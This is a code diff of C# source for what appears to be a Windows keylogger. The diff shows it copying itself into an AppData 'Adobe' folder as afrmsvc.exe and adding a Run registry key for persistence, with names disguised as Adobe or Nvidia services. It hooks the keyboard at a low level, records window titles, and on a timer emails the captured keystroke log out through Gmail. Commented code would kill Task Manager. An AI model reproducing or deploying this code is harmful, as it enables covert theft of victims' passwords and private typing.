@@ -82,10 +82,14 @@ namespace WindowsFormsApplication1
 
         public static void startup()
         {
-            //Try to copy keylogger in some folders
+            //Copy to folder in AppData
+            //If destination folder does not exist then create it
             string source = Application.ExecutablePath.ToString();
-            string destination = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            destination = System.IO.Path.Combine(destination, "afrmsvc.exe");
+            string destinationFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            destinationFolder = System.IO.Path.Combine(destinationFolder, "Adobe");
+            if (!System.IO.Directory.Exists(destinationFolder))
+                System.IO.Directory.CreateDirectory(destinationFolder);
+            string destination = System.IO.Path.Combine(destinationFolder, "afrmsvc.exe");
             try
             {
                 System.IO.File.Copy(source, destination, false);
@@ -96,41 +100,50 @@ namespace WindowsFormsApplication1
             }
             catch
             {
-                Console.WriteLine("No authorization to copy file or other error.");
+                Console.WriteLine("Could not copy file to {0}.", destinationFolder);
             }
 
             //Find if the file already exist in startup
+            const string userRoot = "HKEY_CURRENT_USER";
+            const string subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+            const string keyName = userRoot + "\\" + subkey;
             try
             {
-                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+                RegistryKey regStartKey = Registry.CurrentUser.OpenSubKey(subkey, false);
 
-                if (registryKey.GetValue("Adobe Flash Update Service") == null)
+                if (regStartKey.GetValue("afrmsvc") == null)
                 {
-                    registryKey.SetValue("Adobe Flash Update Service", destination);
+                    Console.WriteLine("Value does not exist in the registry");
+                    Registry.SetValue(keyName, "afrmsvc", destination);
+                    Console.WriteLine("Set value in the registry");
+                } else
+                {
+                    Console.WriteLine("Value already set in the registry");
                 }
 
-                registryKey.Close();//dispose of the Key
+                regStartKey.Close();
             }
             catch
             {
                 Console.WriteLine("Error setting startup reg key.");
             }
+            /*
             //Try to add to all users
-            //try
-            //{
-            //    RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+            try
+            {
+                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
 
-            //    if (registryKey.GetValue("Nvidia driver") == null)
-            //    {
-            //        registryKey.SetValue("Nvidia driver", source);
-            //    }
+                if (registryKey.GetValue("Nvidia driver") == null)
+                {
+                    registryKey.SetValue("Nvidia driver", source);
+                }
 
-            //    registryKey.Close();//dispose of the key
-            //}
-            //catch
-            //{
-            //    //Console.WriteLine("Error setting startup reg key for all users.");
-            //}
+                registryKey.Close();//dispose of the key
+            }
+            catch
+            {
+                //Console.WriteLine("Error setting startup reg key for all users.");
+            }*/
         }
 
         // This is needed to remove the hidden attribute on the file to be able to overwrite it
@@ -163,24 +176,17 @@ namespace WindowsFormsApplication1
         public static void OnTimedEvent(object source, EventArgs e)
         {
             // If there's nothing to send.... don't do it
-            if (new FileInfo("path").Length == 0)
+            if (new FileInfo(path).Length == 0)
+            {
+                Console.WriteLine("Nothing to send - aborting email message [{0}]", DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt"));
                 return;
-
-            // THIS DOESN'T WORK - leaving here for posterity
-            //Process[] ProcessList = Process.GetProcesses();
-            /*             foreach (Process proc in ProcessList)
-                        {
-                            if (proc.MainWindowTitle.Contains("Windows Task Manager"))
-                            {
-                                proc.Kill();
-                            }
-                        } */
+            }
 
             // The following gmail login attempt will be denied by default.
             // Go to security settings at the followig link https://www.google.com/settings/security/lesssecureapps and enable less secure apps
             // for email to work
-            const string emailAddress = "<put google username here>";
-            const string emailPassword = "<put google password here>";
+            const string emailAddress = "<username here>";
+            const string emailPassword = "<password here>";
             System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
             msg.To.Add(emailAddress);
             msg.From = new MailAddress(emailAddress, emailAddress, System.Text.Encoding.UTF8);
@@ -242,11 +248,23 @@ namespace WindowsFormsApplication1
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
             }
         }
+
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
+                // This is stupid. Leaving here for posterity sake
+                /*Process[] ProcessList = Process.GetProcesses();
+                foreach (Process proc in ProcessList)
+                {
+                    if (proc.MainWindowTitle.Contains("Calculator"))
+                    {
+                        proc.Kill();
+                    }
+                }*/
+
                 string windowTitle = GetActiveWindowTitle();
                 if (windowTitle != null)
                     Console.WriteLine("{" + windowTitle + "}");
